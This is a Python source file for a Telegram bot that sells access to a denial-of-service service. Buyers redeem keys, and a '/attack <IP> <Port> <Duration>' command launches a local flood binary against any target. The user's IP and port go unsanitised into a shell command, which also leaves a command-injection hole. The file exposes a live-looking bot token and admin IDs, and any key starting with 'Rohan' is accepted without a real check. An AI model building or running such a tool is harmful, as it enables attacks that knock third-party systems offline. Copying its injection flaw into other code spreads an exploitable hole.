import os
import time
import random
import json
import asyncio
from datetime import datetime, timedelta

from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    CallbackContext,
)

# ================== CONFIGURATION ==================

TOKEN = "8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo"  # Replace with your actual bot token

# Replace with your Telegram ID(s)
admins = {1866961136}  # Owner/admin IDs

# Optional: Set your admin channel/chat ID to receive live feed logs (or leave as None)
ADMIN_CHANNEL_ID = -1002314987826  # e.g., -1001234567890

# Attack configurations
MAX_DURATION_NORMAL = 300  # seconds (5 minutes) for normal users
MAX_DURATION_VIP = 600     # seconds (10 minutes) for VIP users
COOLDOWN_NORMAL = 300      # 5 minutes cooldown for normal users
COOLDOWN_VIP = 60          # 1 minute cooldown for VIP users

# ================== DATA STORAGE (in-memory) ==================

vip_users = {}       # {user_id: expiration_datetime}
attack_logs = {}     # {user_id: list of (timestamp, ip, port, duration)}
cooldowns = {}       # {user_id: available_datetime}
active_attacks = {}  # {attack_id: (user_id, ip, port, duration, end_time)}
banned_users = set() # Set of user IDs
pending_verifications = {}  # {user_id: message_id}

# ================== COMMAND HANDLERS ==================

async def start_command(update: Update, context: CallbackContext):
    """Send a welcome message when the command /start is called."""
    await update.message.reply_text(
        "👋 Welcome to the Attack Bot!\n"
        "This bot allows you to perform simulated attacks. Here are some commands you can use:\n\n"
        "/attack <IP> <Port> <Duration> - Start an attack on a specified target.\n"
        "/info - Get your account information and status.\n"
        "/redeem <key> - Redeem your access key (either normal or VIP).\n"
        "/help - Get this help message.\n"
        "For more information, contact @Rohan2349."
    )

async def help_command(update: Update, context: CallbackContext):
    """Send a help message when the command /help is called."""
    await update.message.reply_text(
        "📚 Help Menu:\n\n"
        "Here are the commands you can use:\n\n"
        "/start - Welcome message and bot introduction.\n"
        "/attack <IP> <Port> <Duration> - Start an attack targeting a specific IP and Port for a set duration.\n"
        "/info - View your user information, including VIP status and cooldown periods.\n"
        "/redeem <key> - Redeem a key to access the bot's features (normal or VIP).\n"
        "/help - Display this help message.\n"
        "/generate_key <normal/vip> [duration] - Generate a new access key (admin only).\n"
        "/addadmin <user_id> - Add a user as an admin (admin only).\n"
        "/removeadmin <user_id> - Remove a user as an admin (admin only).\n"
        "/active_attacks - View currently active attacks (admin only).\n"
        "/unban <user_id> - Unban a user (admin only).\n"
        "/bot_update - Update the bot's codebase (admin only).\n"
        "If you have any questions, please contact @Rohan2349."
    )

# ================== UTILITY FUNCTIONS ==================

def is_vip(user_id: int) -> bool:
    """Check if the user is VIP (and VIP has not expired)."""
    return user_id in vip_users and vip_users[user_id] > datetime.now()

def add_attack_log(user_id: int, ip: str, port: str, duration: int):
    """Store an attack log for the user."""
    entry = (datetime.now(), ip, port, duration)
    if user_id in attack_logs:
        attack_logs[user_id].append(entry)
    else:
        attack_logs[user_id] = [entry]

def log_to_admin_channel(text: str, context: CallbackContext):
    """Send log message to the admin channel if configured."""
    if ADMIN_CHANNEL_ID:
        context.bot.send_message(chat_id=ADMIN_CHANNEL_ID, text=text)

def generate_key(vip: bool = False, duration: int = 1) -> str:
    """Generate a key.
       Normal key: 'Rohan-XXXX' (valid for 1 hour)
       VIP key: 'VIP-Rohan-<duration>-XXXX'
    """
    code = random.randint(1000, 9999)
    if vip:
        return f"VIP-Rohan-{duration}-{code}"
    else:
        return f"Rohan-{code}"

#Load keys from file
def load_keys():
    try:
        with open('keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

#Save keys to file
def save_keys(keys):
    with open('keys.json', 'w') as f:
        json.dump(keys, f)

#Initialize keys
keys = load_keys()

# ================== COMMAND HANDLERS ==================

async def add_admin(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    new_admin = int(context.args[0])
    admins.add(new_admin)
    await update.message.reply_text(f"✅ User {new_admin} has been added as admin.")

async def remove_admin(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /removeadmin <user_id>")
        return
    rem_admin = int(context.args[0])
    if rem_admin in admins:
        admins.remove(rem_admin)
        await update.message.reply_text(f"✅ User {rem_admin} has been removed from admin.")
    else:
        await update.message.reply_text("❌ This user is not an admin.")

async def generate_key_command(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /generate_key <normal/vip> [duration]")
        return

    key_type = context.args[0].lower()
    if key_type == "vip":
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /generate_key vip <duration: 1/3/5/7/30>")
            return
        try:
            duration = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Duration must be a number.")
            return
        if duration not in [1, 3, 5, 7, 30]:
            await update.message.reply_text("❌ Invalid duration! Choose from 1, 3, 5, 7, or 30 days.")
            return
        key = generate_key(vip=True, duration=duration)
        await update.message.reply_text(f"✅ Generated VIP Key: `{key}` (Valid for {duration} day(s))", parse_mode="Markdown")
    elif key_type == "normal":
        key = generate_key(vip=False)
        await update.message.reply_text(f"✅ Generated Normal Key: `{key}` (Valid for 1 hour)", parse_mode="Markdown")
    else:
        await update.message.reply_text("Usage: /generate_key <normal/vip> [duration]")

async def redeem_command(update: Update, context: CallbackContext):
    if not context.args:
        await update.message.reply_text("Usage: /redeem <key>")
        return

    key = context.args[0]
    user_id = update.effective_user.id

    if key.startswith("VIP-Rohan"):
        try:
            # Expected format: VIP-Rohan-<duration>-XXXX
            parts = key.split("-")
            duration_days = int(parts[2])
        except (IndexError, ValueError):
            await update.message.reply_text("❌ Invalid VIP key format!")
            return
        vip_users[user_id] = datetime.now() + timedelta(days=duration_days)
        await update.message.reply_text(f"🎉 You are now VIP until {vip_users[user_id].strftime('%Y-%m-%d %H:%M:%S')}!")
    elif key.startswith("Rohan"):
        vip_users[user_id] = datetime.now() + timedelta(hours=1)
        await update.message.reply_text("✅ You now have normal access for 1 hour!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def info_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in vip_users:
        await update.message.reply_text("❌ You don't have access to view this information.")
        return
        
    vip_status = "✅ VIP" if is_vip(user_id) else "❌ Normal"
    expiration = vip_users[user_id].strftime("%Y-%m-%d %H:%M:%S") if is_vip(user_id) else "N/A"
    attack_limit = MAX_DURATION_VIP if is_vip(user_id) else MAX_DURATION_NORMAL
    cooldown_time = COOLDOWN_VIP if is_vip(user_id) else COOLDOWN_NORMAL
    
    await update.message.reply_text(
        f"ℹ️ **User Info**\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"⭐ **Status:** {vip_status}\n"
        f"⏳ **VIP Expiration:** {expiration}\n"
        f"💥 **Max Attack Duration:** {attack_limit} seconds\n"
        f"⏰ **Cooldown Time:** {cooldown_time} seconds",
        parse_mode="Markdown"
    )

async def unban_command(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    uid = int(context.args[0])
    if uid in banned_users:
        banned_users.remove(uid)
        await update.message.reply_text(f"✅ User {uid} has been unbanned.")
    else:
        await update.message.reply_text("❌ This user is not banned.")

async def active_attacks_command(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not active_attacks:
        await update.message.reply_text("✅ No active attacks.")
        return

    text = "🔥 **Active Attacks:**\n"
    for attack_id, (uid, ip, port, duration, end_time) in active_attacks.items():
        text += (f"📌 ID: {attack_id} | User: {uid} | Target: {ip}:{port} "
                 f"({duration}s) | Ends at: {end_time.strftime('%H:%M:%S')}\n")
    await update.message.reply_text(text, parse_mode="Markdown")

async def bot_update(update: Update, context: CallbackContext):
    if update.effective_user.id not in admins:
        await update.message.reply_text("❌ You are not authorized.")
        return
    await update.message.reply_text("🔄 Updating bot system... Please wait.")
    try:
        os.system("git pull")
        await update.message.reply_text("✅ Bot system updated successfully!")
    except Exception as e:
        await update.message.reply_text(f"❌ Update failed: {str(e)}")

# ================== ATTACK HANDLER & VERIFICATION ==================

async def attack_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    # Check if user is banned
    if user_id in banned_users:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return

    # Check access: user must have redeemed a key (stored in vip_users)
    if user_id not in vip_users:
        await update.message.reply_text("❌ You don't have access to use this command.\nDM to buy - @Rohan2349")
        return

    # Parse parameters: /attack <IP> <Port> <Duration>
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <Port> <Duration>")
        return

    ip, port, duration_str = context.args
    try:
        duration = int(duration_str)
    except ValueError:
        await update.message.reply_text("❌ Duration must be a number!")
        return

    max_duration = MAX_DURATION_VIP if is_vip(user_id) else MAX_DURATION_NORMAL
    if duration > max_duration:
        await update.message.reply_text(f"❌ Max attack duration is {max_duration} seconds!")
        return

    # Check cooldown
    if user_id in cooldowns and cooldowns[user_id] > datetime.now():
        await update.message.reply_text("⏳ You are on cooldown! Please wait.")
        return

    # Set cooldown
    cooldowns[user_id] = datetime.now() + timedelta(seconds=(COOLDOWN_VIP if is_vip(user_id) else COOLDOWN_NORMAL))

    attack_id = random.randint(1000, 9999)
    end_time = datetime.now() + timedelta(seconds=duration)
    active_attacks[attack_id] = (user_id, ip, port, duration, end_time)
    add_attack_log(user_id, ip, port, duration)
    log_to_admin_channel(f"🚀 Attack Started: User {user_id} targeting {ip}:{port} for {duration}s", context)

    # Execute binary command in the background
    binary_cmd = f"./Rohan {ip} {port} {duration}"
    asyncio.create_task(asyncio.create_subprocess_shell(binary_cmd))

    # Send attack start message with real-time countdown
    msg = await update.message.reply_text(
        f"🚀 Attack Started!\n👤 User: {update.effective_user.username} (ID: {user_id})\n"
        f"🎯 Target: {ip}:{port}\n⏳ Duration: {duration} seconds.\n⏳ Time Left: {duration}s"
    )

    for remaining in range(duration, 0, -1):
        await asyncio.sleep(1)
        try:
            await msg.edit_text(
                f"🚀 Attack Started!\n👤 User: {update.effective_user.username} (ID: {user_id})\n"
                f"🎯 Target: {ip}:{port}\n⏳ Time Left: {remaining}s"
            )
        except Exception:
            pass  # In case the message was deleted or cannot be edited

    # Remove attack from active list and update message to completion
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    await msg.edit_text(
        f"✅ Attack Completed!\n👤 User: {update.effective_user.username} (ID: {user_id})\n"
        f"🎯 Target: {ip}:{port}\n⏳ Duration: {duration} seconds."
    )
    log_to_admin_channel(f"✅ Attack Completed: User {user_id} targeting {ip}:{port}", context)

# ================== APPLICATION SETUP ==================

def main():
    app = Application.builder().token(TOKEN).build()

    # User commands
    app.add_handler(CommandHandler("start", start_command))  # Add start command
    app.add_handler(CommandHandler("help", help_command))    # Add help command
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CommandHandler("redeem", redeem_command))

    # Admin commands
    app.add_handler(CommandHandler("addadmin", add_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("generate_key", generate_key_command))
    app.add_handler(CommandHandler("active_attacks", active_attacks_command))
    app.add_handler(CommandHandler("bot_update", bot_update))
    app.add_handler(CommandHandler("unban", unban_command))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()